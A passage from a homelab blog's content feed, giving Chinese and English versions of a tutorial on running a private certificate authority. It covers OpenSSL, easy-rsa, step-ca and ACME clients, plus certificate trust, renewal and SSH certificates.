# 產生權杖（5 分鐘後過期） TOKEN&#x3D;$(step ca token homeserver.local) ✔ Provisioner: admin@homelab.local (JWK) ✔ Please enter the password to decrypt the provisioner key: ******** # 在容器&#x2F;虛擬機中：建立 CSR step certificate create --csr homeserver.local homeserver.csr homeserver.key # 在容器&#x2F;虛擬機中：使用權杖取得憑證 step ca sign --token $TOKEN homeserver.csr homeserver.crt ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 ✔ Certificate: homeserver.crt 這非常適合： 啟動時需要憑證的 Docker 容器 虛擬機佈建工作流程 CI/CD 管線 在不共享 CA 憑證的情況下委派憑證簽發 ACME 整合（類似 Let’s Encrypt）： ACME（自動化憑證管理環境）是 Let’s Encrypt 使用的協定。step-ca 支援 ACME，實現完全自動化的憑證簽發和更新。 啟用 ACME： # 新增 ACME 佈建者（如果初始化時未完成） step ca provisioner add acme --type ACME # 重新啟動 step-ca 以套用變更 sudo systemctl restart step-ca ACME 挑戰類型： 挑戰 連接埠 使用情境 難度 http-01 80 通用目的、網頁伺服器 簡單 dns-01 53 萬用字元憑證、防火牆後的伺服器 中等 tls-alpn-01 443 僅 TLS 環境 中等 使用 step 作為 ACME 客戶端： # HTTP-01 挑戰（在連接埠 80 啟動網頁伺服器） step ca certificate --provisioner acme example.com example.crt example.key ✔ Provisioner: acme (ACME) Using Standalone Mode HTTP challenge to validate example.com .. done! Waiting for Order to be &#39;ready&#39; for finalization .. done! Finalizing Order .. done! ✔ Certificate: example.crt ✔ Private Key: example.key 使用 certbot： # HTTP-01 挑戰 certbot certonly --standalone \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local \\ --register-unsafely-without-email # DNS-01 挑戰（用於萬用字元憑證） certbot certonly --manual --preferred-challenges dns \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d &#39;*.homelab.local&#39; # 自動更新 certbot renew --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory 使用 acme.sh： # HTTP-01 挑戰 acme.sh --issue --standalone \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local # 使用 Cloudflare 的 DNS-01 export CF_Token&#x3D;&quot;your-cloudflare-api-token&quot; acme.sh --issue --dns dns_cf \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local # 自動更新（每日執行） acme.sh --cron ACME 流程圖： sequenceDiagram participant Client as ACME 客戶端 participant CA as step-ca participant Web as 網頁伺服器 Client->>CA: 1. 建立帳戶並訂購憑證 CA->>Client: 2. 回傳挑戰（http-01、dns-01、tls-alpn-01） Client->>Web: 3. 在 /.well-known/acme-challenge/ 放置挑戰回應 Client->>CA: 4. 準備驗證 CA->>Web: 5. 驗證挑戰回應 CA->>Client: 6. 挑戰已驗證 Client->>CA: 7. 提交 CSR CA->>Client: 8. 簽發憑證 Note over Client,CA: 憑證自動簽發！ 為什麼 ACME 更好： 零人工介入 - 完全自動化的憑證生命週期 自動更新 - 不會有過期的憑證 業界標準 - 適用於任何 ACME 客戶端 大規模驗證 - 支援 Let’s Encrypt（數十億憑證） 內建驗證 - 自動證明網域/IP 所有權 與 Traefik 整合： # traefik.yml entryPoints: websecure: address: &quot;:443&quot; certificatesResolvers: homelab: acme: caServer: https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory storage: &#x2F;acme.json tlsChallenge: &#123;&#125; # docker-compose.yml services: whoami: image: traefik&#x2F;whoami labels: - &quot;traefik.http.routers.whoami.rule&#x3D;Host(&#96;whoami.homelab.local&#96;)&quot; - &quot;traefik.http.routers.whoami.tls.certresolver&#x3D;homelab&quot; Docker Compose 設定： version: &#39;3&#39; services: step-ca: image: smallstep&#x2F;step-ca ports: - &quot;8443:8443&quot; volumes: - step-ca-data:&#x2F;home&#x2F;step environment: - DOCKER_STEPCA_INIT_NAME&#x3D;Home Lab - DOCKER_STEPCA_INIT_DNS_NAMES&#x3D;ca.homelab.local - DOCKER_STEPCA_INIT_PROVISIONER_NAME&#x3D;admin@homelab.local restart: unless-stopped volumes: step-ca-data: 比較：OpenSSL vs step-ca 任務 OpenSSL step-ca 建立 CA 多個指令、設定檔 step ca init 簽發憑證 5+ 個指令加設定 step ca certificate 更新 手動腳本 step ca renew --daemon ACME 支援 未內建 內建 學習曲線 陡峭 平緩 自動化 DIY 內建 SSH 憑證 複雜 step ssh 指令 💡 何時使用 step-ca如果你符合以下情況，請使用 step-ca： 想要自動化憑證管理 需要 ACME 協定支援 想與現代工具整合（Traefik、Kubernetes） 偏好簡單的 CLI 而非複雜的 OpenSSL 指令 需要 SSH 憑證管理 想要內建的更新自動化 如果你符合以下情況，請堅持使用 OpenSSL： 需要對每個細節的最大控制 有現有的基於 OpenSSL 的工作流程 在無法取得 step-ca 二進位檔的隔離環境中工作 需要 step-ca 不支援的特定憑證擴充功能 安裝你的 CA 憑證 Windows 雙擊 root-ca.crt 點擊「安裝憑證」 選擇「本機電腦」 選擇「將所有憑證放入以下的存放區」 選擇「受信任的根憑證授權單位」 點擊「完成」 macOS sudo security add-trusted-cert -d -r trustRoot -k &#x2F;Library&#x2F;Keychains&#x2F;System.keychain root-ca.crt Linux (Ubuntu/Debian) sudo cp root-ca.crt &#x2F;usr&#x2F;local&#x2F;share&#x2F;ca-certificates&#x2F;homelab-root-ca.crt sudo update-ca-certificates iOS/iPadOS 將 root-ca.crt 寄給自己或放在網頁伺服器上 在裝置上開啟檔案 前往「設定」→「一般」→「VPN 與裝置管理」 安裝描述檔 前往「設定」→「一般」→「關於本機」→「憑證信任設定」 為該憑證啟用完全信任 Android 將 root-ca.crt 複製到裝置 「設定」→「安全性」→「加密與憑證」→「安裝憑證」 選擇「CA 憑證」 瀏覽並選擇你的憑證 設定服務 Nginx server &#123; listen 443 ssl; server_name homeserver.local; ssl_certificate &#x2F;path&#x2F;to&#x2F;homeserver.crt; ssl_certificate_key &#x2F;path&#x2F;to&#x2F;homeserver.key; # 選用：包含中繼 CA # ssl_certificate 應包含：伺服器憑證 + 中繼憑證 ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:8080; &#125; &#125; Apache &lt;VirtualHost *:443&gt; ServerName homeserver.local SSLEngine on SSLCertificateFile &#x2F;path&#x2F;to&#x2F;homeserver.crt SSLCertificateKeyFile &#x2F;path&#x2F;to&#x2F;homeserver.key SSLCertificateChainFile &#x2F;path&#x2F;to&#x2F;intermediate-ca.crt ProxyPass &#x2F; http:&#x2F;&#x2F;localhost:8080&#x2F; ProxyPassReverse &#x2F; http:&#x2F;&#x2F;localhost:8080&#x2F; &lt;&#x2F;VirtualHost&gt; Docker Compose version: &#39;3&#39; services: web: image: nginx:alpine ports: - &quot;443:443&quot; volumes: - .&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf - .&#x2F;homeserver.crt:&#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;cert.crt - .&#x2F;homeserver.key:&#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;cert.key 憑證管理 憑證生命週期 flowchart TD A[\"📝 建立憑證\"] --> B[\"🚀 部署到伺服器\"] B --> C[\"👁️ 監控到期日\"] C --> D{\"⏰ 即將到期？\"} D -->|\"否\"| C D -->|\"是（生命週期的 2/3）\"| E[\"🔄 更新憑證\"] E --> F[\"🚀 重新部署到伺服器\"] F --> C style A fill:#e3f2fd style B fill:#e8f5e9 style C fill:#fff3e0 style D fill:#fff9c4 style E fill:#f3e5f5 style F fill:#e8f5e9 更新腳本 #!&#x2F;bin&#x2F;bash # renew-cert.sh DOMAIN&#x3D;&quot;homeserver.local&quot; CERT_DIR&#x3D;&quot;&#x2F;etc&#x2F;ssl&#x2F;homelab&quot; # 產生新的金鑰和 CSR openssl genrsa -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.key 2048 openssl req -new -key $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.key \\ -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.csr \\ -subj &quot;&#x2F;CN&#x3D;$&#123;DOMAIN&#125;&quot; # 使用中繼 CA 簽署 openssl x509 -req -in $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.csr \\ -CA $&#123;CERT_DIR&#125;&#x2F;intermediate-ca.crt \\ -CAkey $&#123;CERT_DIR&#125;&#x2F;intermediate-ca.key \\ -CAcreateserial -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.crt \\ -days 365 -sha256 # 重新載入 nginx systemctl reload nginx echo &quot;Certificate renewed for $&#123;DOMAIN&#125;&quot; 使用 Cron 自動化 # 新增到 crontab：在到期前 30 天更新 0 0 1 * * &#x2F;path&#x2F;to&#x2F;renew-cert.sh 安全最佳實務 ⚠️ 關鍵安全措施保護你的根 CA 私鑰： 儲存在加密的 USB 隨身碟上並離線保存 絕不暴露於網路 使用強密碼（AES-256） 保留多個加密備份 生產環境考慮使用硬體安全模組（HSM） 關鍵安全措施： 分離根 CA 和中繼 CA 根 CA：離線，僅用於簽署中繼 CA 中繼 CA：線上，簽署伺服器憑證 使用強金鑰大小 根 CA：4096 位元 RSA 或 EC P-384 中繼 CA：4096 位元 RSA 或 EC P-384 伺服器憑證：最少 2048 位元 RSA 設定適當的有效期 根 CA：10-20 年 中繼 CA：5 年 伺服器憑證：1 年（更容易輪換） 實施憑證撤銷 維護憑證撤銷清單（CRL） 或使用線上憑證狀態協定（OCSP） 稽核和監控 記錄所有憑證簽發 監控未授權的憑證 定期安全稽核 常見問題與解決方案 問題：瀏覽器仍顯示警告 原因： CA 憑證未正確安裝 憑證未包含正確的 SAN（主體別名） 透過 IP 存取但憑證只有 DNS 名稱 解決方案： # 檢查憑證 SAN openssl x509 -in homeserver.crt -text -noout | grep -A1 &quot;Subject Alternative Name&quot; # 確保憑證包含所有存取方式 DNS.1 &#x3D; homeserver.local DNS.2 &#x3D; homeserver IP.1 &#x3D; 192.168.1.100 問題：憑證鏈不完整 解決方案： 建立憑證組合： cat homeserver.crt intermediate-ca.crt &gt; homeserver-bundle.crt 在伺服器設定中使用組合檔。 問題：私鑰權限 # 設定正確的權限 chmod 600 homeserver.key chown root:root homeserver.key 進階：自動化憑證管理 使用 step-ca 的 SSH 憑證 如果你使用 --ssh 初始化，step-ca 也可以簽發 SSH 憑證以實現無密碼驗證。 設定 SSH 使用者驗證： # 在 SSH 伺服器上：信任使用者 CA step ssh config --roots &gt; &#x2F;etc&#x2F;ssh&#x2F;ssh_user_ca.pub echo &#39;TrustedUserCAKeys &#x2F;etc&#x2F;ssh&#x2F;ssh_user_ca.pub&#39; | sudo tee -a &#x2F;etc&#x2F;ssh&#x2F;sshd_config sudo systemctl restart sshd # 在客戶端：取得 SSH 使用者憑證 step ssh certificate alice@homelab.local id_ecdsa ✔ Provisioner: admin@homelab.local (JWK) ✔ Please enter the password to decrypt the provisioner key: ******** ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 ✔ Private Key: id_ecdsa ✔ Certificate: id_ecdsa-cert.pub ✔ SSH Agent: yes # 檢查憑證 cat id_ecdsa-cert.pub | step ssh inspect 設定 SSH 主機驗證： # 在 SSH 伺服器上：取得主機憑證 cd &#x2F;etc&#x2F;ssh sudo step ssh certificate --host --sign server.homelab.local ssh_host_ecdsa_key.pub # 設定 SSHD 使用憑證 echo &#39;HostCertificate &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key-cert.pub&#39; | sudo tee -a &#x2F;etc&#x2F;ssh&#x2F;sshd_config sudo systemctl restart sshd # 在客戶端：信任主機 CA step ssh config --host --roots &gt;&gt; ~&#x2F;.ssh&#x2F;known_hosts # 前面加上：@cert-authority * 自動化 SSH 主機憑證更新： # 建立每週更新 cron cat &lt;&lt;EOF | sudo tee &#x2F;etc&#x2F;cron.weekly&#x2F;renew-ssh-cert #!&#x2F;bin&#x2F;sh export STEPPATH&#x3D;&#x2F;root&#x2F;.step cd &#x2F;etc&#x2F;ssh &amp;&amp; step ssh renew ssh_host_ecdsa_key-cert.pub ssh_host_ecdsa_key --force exit 0 EOF sudo chmod 755 &#x2F;etc&#x2F;cron.weekly&#x2F;renew-ssh-cert 使用 step-ca 與 nginx-proxy-manager # 1. 從 step-ca 取得憑證 step ca certificate npm.homelab.local npm.crt npm.key # 2. 在 nginx-proxy-manager UI 中： # - SSL 憑證 → 新增 SSL 憑證 → 自訂 # - 上傳 npm.crt 和 npm.key # - 使用 step ca renew --daemon 設定自動更新 使用 step-ca 與 Home Assistant # configuration.yaml http: ssl_certificate: &#x2F;ssl&#x2F;homeassistant.crt ssl_key: &#x2F;ssl&#x2F;homeassistant.key # 取得憑證 # step ca certificate homeassistant.local &#x2F;ssl&#x2F;homeassistant.crt &#x2F;ssl&#x2F;homeassistant.key 監控和管理 # 檢查憑證到期日 step certificate inspect homeserver.crt --short X.509v3 TLS Certificate (ECDSA P-256) [Serial: 7720...1576] Subject: homeserver.local Issuer: Home Lab Intermediate CA Valid from: 2025-05-15T00:59:37Z to: 2025-05-16T01:00:37Z # 撤銷憑證（被動撤銷 - 阻止更新） step ca revoke --cert homeserver.crt --key homeserver.key ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 Certificate with Serial Number 30671613121311574910895916201205874495 has been revoked. # 列出佈建者 step ca provisioner list 比較：私有 CA vs Let’s Encrypt 功能 私有 CA Let’s Encrypt 成本 免費 免費 內部 IP ✅ 是 ❌ 否 .local 網域 ✅ 是 ❌ 否 離線運作 ✅ 是 ❌ 否 自動更新 手動/自訂 ✅ 內建 公開信任 ❌ 否 ✅ 是 設定複雜度 中等 低 維護 手動 自動化 何時使用私有 CA： 僅限內部服務 私有 IP 位址 .local 或自訂 TLD 隔離網路 需要完全控制 何時使用 Let’s Encrypt： 公開服務 公開網域名稱 想要自動更新 不想管理 CA 基礎設施 資源 OpenSSL 文件： 完整的 OpenSSL 參考 easy-rsa： 簡化的 CA 管理 step-ca： 支援 ACME 的現代化 CA PKI 教學： 全面的 PKI 指南 結論 建立私有 CA 一開始可能看起來令人生畏，但一旦設定完成，它就能消除那些煩人的瀏覽器警告，並為你的家庭實驗室服務提供適當的加密。初期的時間投資會帶來更專業、更安全的家庭網路。 重點摘要： 私有 CA 為內部服務啟用受信任的 HTTPS 推薦使用 step-ca 進行現代化的自動憑證管理 兩層架構（根 + 中繼）提供更好的安全性 在所有裝置上安裝一次根 CA 憑證 自動化憑證更新以避免到期問題（step-ca 讓這變得簡單） 保持根 CA 私鑰離線並確保安全 SSH 憑證消除密碼驗證並提高安全性 快速入門建議： 對於大多數家庭實驗室，使用 step-ca： step ca init --acme --ssh（一個指令設定） step certificate install $(step path)/certs/root_ca.crt（在所有裝置上信任） step ca certificate service.local service.crt service.key（取得憑證） step ca renew service.crt service.key --daemon（自動更新） 從單一服務開始，熟悉流程後，再擴展到整個家庭實驗室。當你不再需要點擊安全警告時，未來的你會感謝現在的自己！🔒","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"PKI","slug":"PKI","permalink":"https://neo01.com/tags/PKI/"}],"lang":"zh-TW"},{"title":"Setting Up a Private Certificate Authority at Home","slug":"2024/03/Private-CA-at-Home","date":"un55fin55","updated":"un00fin00","comments":false,"path":"2024/03/Private-CA-at-Home/","permalink":"https://neo01.com/2024/03/Private-CA-at-Home/","excerpt":"Tired of browser warnings on your homelab services? Learn how to set up your own Certificate Authority to issue trusted SSL certificates for internal services.","text":"You’ve set up a beautiful homelab with multiple services—Nextcloud, Home Assistant, Plex, maybe a NAS. Everything works great, except for one annoying thing: every time you access these services via HTTPS, your browser screams “Your connection is not private!” Sure, you could click “Advanced” and “Proceed anyway” every single time. But what if I told you there’s a better way? Welcome to the world of private Certificate Authorities. Why You Need a Private CA The Problem: When you access https://192.168.1.100 or https://homeserver.local, your browser doesn’t trust the connection because: Self-signed certificates aren’t trusted by default Public CAs (Let’s Encrypt, DigiCert) won’t issue certificates for private IP addresses or .local domains Clicking through security warnings defeats the purpose of HTTPS The Solution: Create your own Certificate Authority (CA) that: Issues certificates for your internal services Gets trusted by all your devices once installed Works offline without external dependencies Gives you full control over certificate lifecycle Understanding the Basics What is a Certificate Authority? A CA is an entity that issues digital certificates. When your browser trusts a CA, it automatically trusts any certificate signed by that CA. The Trust Chain: flowchart TD A[\"🏛️ Root CA(Your Private CA)\"] --> B[\"📜 Intermediate CA(Optional)\"] B --> C[\"🔒 Server Certificate(homeserver.local)\"] B --> D[\"🔒 Server Certificate(nas.local)\"] B --> E[\"🔒 Server Certificate(192.168.1.100)\"] F[\"💻 Your Devices\"] -.->|\"Trust\"| A F -->|\"Automatically trust\"| C F -->|\"Automatically trust\"| D F -->|\"Automatically trust\"| E style A fill:#e3f2fd style B fill:#f3e5f5 style C fill:#e8f5e9 style D fill:#e8f5e9 style E fill:#e8f5e9 style F fill:#fff3e0 Root CA vs Intermediate CA Root CA: The top-level authority. Keep this offline and secure. Intermediate CA: Signs actual certificates. Can be revoked without affecting the root. Server Certificates: What your services use for HTTPS. 💡 Best PracticeUse a two-tier hierarchy: Root CA → Intermediate CA → Server Certificates. This way, if your intermediate CA is compromised, you can revoke it without re-trusting the root on all devices. Setting Up Your Private CA Method 1: Using OpenSSL (Manual Control) Step 1: Create Root CA # Generate root CA private key (keep this VERY secure!) openssl genrsa -aes256 -out root-ca.key 4096 # Create root CA certificate (valid for 10 years) openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 3650 \\ -out root-ca.crt \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;Home Lab Root CA&quot; Step 2: Create Intermediate CA # Generate intermediate CA private key openssl genrsa -aes256 -out intermediate-ca.key 4096 # Create certificate signing request (CSR) openssl req -new -key intermediate-ca.key -out intermediate-ca.csr \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;Home Lab Intermediate CA&quot; # Sign intermediate CA with root CA openssl x509 -req -in intermediate-ca.csr -CA root-ca.crt -CAkey root-ca.key \\ -CAcreateserial -out intermediate-ca.crt -days 1825 -sha256 \\ -extfile &lt;(echo &quot;basicConstraints&#x3D;CA:TRUE&quot;) Step 3: Issue Server Certificate # Generate server private key openssl genrsa -out homeserver.key 2048 # Create CSR for your server openssl req -new -key homeserver.key -out homeserver.csr \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;homeserver.local&quot; # Create SAN (Subject Alternative Name) config cat &gt; san.cnf &lt;&lt;EOF [req] distinguished_name &#x3D; req_distinguished_name req_extensions &#x3D; v3_req [req_distinguished_name] [v3_req] subjectAltName &#x3D; @alt_names [alt_names] DNS.1 &#x3D; homeserver.local DNS.2 &#x3D; homeserver IP.1 &#x3D; 192.168.1.100 EOF # Sign server certificate with intermediate CA openssl x509 -req -in homeserver.csr -CA intermediate-ca.crt \\ -CAkey intermediate-ca.key -CAcreateserial -out homeserver.crt \\ -days 365 -sha256 -extfile san.cnf -extensions v3_req Method 2: Using easy-rsa (Simplified) # Install easy-rsa git clone https:&#x2F;&#x2F;github.com&#x2F;OpenVPN&#x2F;easy-rsa.git cd easy-rsa&#x2F;easyrsa3 # Initialize PKI .&#x2F;easyrsa init-pki # Build CA .&#x2F;easyrsa build-ca # Generate server certificate .&#x2F;easyrsa gen-req homeserver nopass .&#x2F;easyrsa sign-req server homeserver Method 3: Using step-ca (Modern Approach - Recommended) step-ca is a modern, automated CA that simplifies certificate management. Think of it as “Let’s Encrypt for your homelab.” Why step-ca is Better: Automated certificate management with ACME protocol support Built-in certificate renewal - no manual scripts needed OAuth/OIDC integration for SSH certificates Simple CLI - no complex OpenSSL commands Web-based workflows for certificate requests Short-lived certificates by default (better security) Remote management capabilities Installation: # macOS brew install step # Ubuntu&#x2F;Debian curl -fsSL https:&#x2F;&#x2F;packages.smallstep.com&#x2F;keys&#x2F;apt&#x2F;repo-signing-key.gpg -o &#x2F;etc&#x2F;apt&#x2F;trusted.gpg.d&#x2F;smallstep.asc echo &#39;deb [signed-by&#x3D;&#x2F;etc&#x2F;apt&#x2F;trusted.gpg.d&#x2F;smallstep.asc] https:&#x2F;&#x2F;packages.smallstep.com&#x2F;stable&#x2F;debian debs main&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;smallstep.list sudo apt update &amp;&amp; sudo apt install step-cli step-ca # RHEL&#x2F;Fedora sudo dnf install step-cli step-ca # Windows (Winget) winget install Smallstep.step-ca # Docker docker pull smallstep&#x2F;step-ca Initialize Your CA: # Interactive setup step ca init # You&#39;ll be prompted for: # - PKI name (e.g., &quot;Home Lab&quot;) # - DNS names (e.g., &quot;ca.homelab.local&quot;) # - Listen address (e.g., &quot;127.0.0.1:8443&quot;) # - First provisioner email (e.g., &quot;admin@homelab.local&quot;) # - Password for CA keys # Example output: ✔ What would you like to name your new PKI? Home Lab ✔ What DNS names or IP addresses would you like to add to your new CA? ca.homelab.local ✔ What address will your new CA listen at? 127.0.0.1:8443 ✔ What would you like to name the first provisioner? admin@homelab.local ✔ What do you want your password to be? ******** ✔ Root certificate: &#x2F;home&#x2F;user&#x2F;.step&#x2F;certs&#x2F;root_ca.crt ✔ Root fingerprint: 702a094e239c9eec6f0dcd0a5f65e595bf7ed6614012825c5fe3d1ae1b2fd6ee Advanced Init Options: # With ACME support (for automatic certificate management) step ca init --acme # With SSH certificate support step ca init --ssh # For Kubernetes deployment step ca init --helm # With remote management enabled step ca init --remote-management Start the CA Server: # Start CA step-ca $(step path)&#x2F;config&#x2F;ca.json # Or run as systemd service sudo systemctl enable step-ca sudo systemctl start step-ca Issue Your First Certificate: # Simple certificate issuance step ca certificate homeserver.local homeserver.crt homeserver.key # You&#39;ll be prompted for the provisioner password ✔ Key ID: rQxROEr7Kx9TNjSQBTETtsu3GKmuW9zm02dMXZ8GUEk ✔ Please enter the password to decrypt the provisioner key: ******** ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;1.0&#x2F;sign ✔ Certificate: homeserver.crt ✔ Private Key: homeserver.key # With Subject Alternative Names (SANs) step ca certificate homeserver.local homeserver.crt homeserver.key \\ --san homeserver \\ --san 192.168.1.100 # With custom validity period step ca certificate homeserver.local homeserver.crt homeserver.key \\ --not-after 8760h # 1 year Trust Your CA on Client Machines: # Bootstrap trust (downloads root CA and configures step) step ca bootstrap --ca-url https:&#x2F;&#x2F;ca.homelab.local:8443 \\ --fingerprint 702a094e239c9eec6f0dcd0a5f65e595bf7ed6614012825c5fe3d1ae1b2fd6ee # Install root CA into system trust store step certificate install $(step path)&#x2F;certs&#x2F;root_ca.crt Automatic Certificate Renewal: step-ca makes renewal trivial: # Renew certificate (before expiration) step ca renew homeserver.crt homeserver.key ✔ Would you like to overwrite homeserver.crt [y&#x2F;n]: y Your certificate has been saved in homeserver.crt. # Automatic renewal daemon (renews at 2&#x2F;3 of certificate lifetime) step ca renew homeserver.crt homeserver.key --daemon # Force renewal step ca renew homeserver.crt homeserver.key --force ⏰ Renewal TimingOnce a certificate expires, the CA will not renew it. Set up automated renewals to run at around two-thirds of a certificate's lifetime. The --daemon flag handles this automatically. Adjust Certificate Lifetimes: # 5-minute certificate (for sensitive access) step ca certificate localhost localhost.crt localhost.key --not-after&#x3D;5m # 90-day certificate (for servers) step ca certificate homeserver.local homeserver.crt homeserver.key --not-after&#x3D;2160h # Certificate valid starting 5 minutes from now step ca certificate localhost localhost.crt localhost.key --not-before&#x3D;5m --not-after&#x3D;240h To change global defaults, edit $(step path)/config/ca.json: &quot;authority&quot;: &#123; &quot;claims&quot;: &#123; &quot;minTLSCertDuration&quot;: &quot;5m&quot;, &quot;maxTLSCertDuration&quot;: &quot;2160h&quot;, &quot;defaultTLSCertDuration&quot;: &quot;24h&quot; &#125; &#125; Advanced: Single-Use Tokens (For Containers/VMs): Generate a short-lived token for delegated certificate issuance: # Generate token (expires in 5 minutes) TOKEN&#x3D;$(step ca token homeserver.local) ✔ Provisioner: admin@homelab.local (JWK) ✔ Please enter the password to decrypt the provisioner key: ******** # In container&#x2F;VM: Create CSR step certificate create --csr homeserver.local homeserver.csr homeserver.key # In container&#x2F;VM: Get certificate using token step ca sign --token $TOKEN homeserver.csr homeserver.crt ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 ✔ Certificate: homeserver.crt This is perfect for: Docker containers that need certificates at startup VM provisioning workflows CI/CD pipelines Delegating certificate issuance without sharing CA credentials ACME Integration (Like Let’s Encrypt): ACME (Automated Certificate Management Environment) is the protocol Let’s Encrypt uses. step-ca supports ACME for fully automated certificate issuance and renewal. Enable ACME: # Add ACME provisioner (if not done during init) step ca provisioner add acme --type ACME # Restart step-ca to apply changes sudo systemctl restart step-ca ACME Challenge Types: Challenge Port Use Case Difficulty http-01 80 General purpose, web servers Easy dns-01 53 Wildcard certs, firewalled servers Medium tls-alpn-01 443 TLS-only environments Medium Using step as ACME Client: # HTTP-01 challenge (starts web server on port 80) step ca certificate --provisioner acme example.com example.crt example.key ✔ Provisioner: acme (ACME) Using Standalone Mode HTTP challenge to validate example.com .. done! Waiting for Order to be &#39;ready&#39; for finalization .. done! Finalizing Order .. done! ✔ Certificate: example.crt ✔ Private Key: example.key Using certbot: # HTTP-01 challenge certbot certonly --standalone \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local \\ --register-unsafely-without-email # DNS-01 challenge (for wildcard certificates) certbot certonly --manual --preferred-challenges dns \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d &#39;*.homelab.local&#39; # Automatic renewal certbot renew --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory Using acme.sh: # HTTP-01 challenge acme.sh --issue --standalone \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local # DNS-01 with Cloudflare export CF_Token&#x3D;&quot;your-cloudflare-api-token&quot; acme.sh --issue --dns dns_cf \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local # Automatic renewal (runs daily) acme.sh --cron ACME Flow Diagram: sequenceDiagram participant Client as ACME Client participant CA as step-ca participant Web as Web Server Client->>CA: 1. Create account & order certificate CA->>Client: 2. Return challenges (http-01, dns-01, tls-alpn-01) Client->>Web: 3. Place challenge response at /.well-known/acme-challenge/ Client->>CA: 4. Ready for validation CA->>Web: 5. Verify challenge response CA->>Client: 6. Challenge validated Client->>CA: 7. Submit CSR CA->>Client: 8. Issue certificate Note over Client,CA: Certificate issued automatically! Why ACME is Better: Zero human interaction - Fully automated certificate lifecycle Automatic renewal - No expired certificates Industry standard - Works with any ACME client Proven at scale - Powers Let’s Encrypt (billions of certificates) Built-in validation - Proves domain/IP ownership automatically Integration with Traefik: # traefik.yml entryPoints: websecure: address: &quot;:443&quot; certificatesResolvers: homelab: acme: caServer: https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory storage: &#x2F;acme.json tlsChallenge: &#123;&#125; # docker-compose.yml services: whoami: image: traefik&#x2F;whoami labels: - &quot;traefik.http.routers.whoami.rule&#x3D;Host(&#96;whoami.homelab.local&#96;)&quot; - &quot;traefik.http.routers.whoami.tls.certresolver&#x3D;homelab&quot; Docker Compose Setup: version: &#39;3&#39; services: step-ca: image: smallstep&#x2F;step-ca ports: - &quot;8443:8443&quot; volumes: - step-ca-data:&#x2F;home&#x2F;step environment: - DOCKER_STEPCA_INIT_NAME&#x3D;Home Lab - DOCKER_STEPCA_INIT_DNS_NAMES&#x3D;ca.homelab.local - DOCKER_STEPCA_INIT_PROVISIONER_NAME&#x3D;admin@homelab.local restart: unless-stopped volumes: step-ca-data: Comparison: OpenSSL vs step-ca Task OpenSSL step-ca Create CA Multiple commands, config files step ca init Issue certificate 5+ commands with config step ca certificate Renewal Manual script step ca renew --daemon ACME support Not built-in Built-in Learning curve Steep Gentle Automation DIY Built-in SSH certificates Complex step ssh commands 💡 When to Use step-caUse step-ca if you: Want automated certificate management Need ACME protocol support Want to integrate with modern tools (Traefik, Kubernetes) Prefer simple CLI over complex OpenSSL commands Need SSH certificate management Want built-in renewal automation Stick with OpenSSL if you: Need maximum control over every detail Have existing OpenSSL-based workflows Work in air-gapped environments without step-ca binaries Require specific certificate extensions not supported by step-ca Installing Your CA Certificate Windows Double-click root-ca.crt Click “Install Certificate” Select “Local Machine” Choose “Place all certificates in the following store” Select “Trusted Root Certification Authorities” Click “Finish” macOS sudo security add-trusted-cert -d -r trustRoot -k &#x2F;Library&#x2F;Keychains&#x2F;System.keychain root-ca.crt Linux (Ubuntu/Debian) sudo cp root-ca.crt 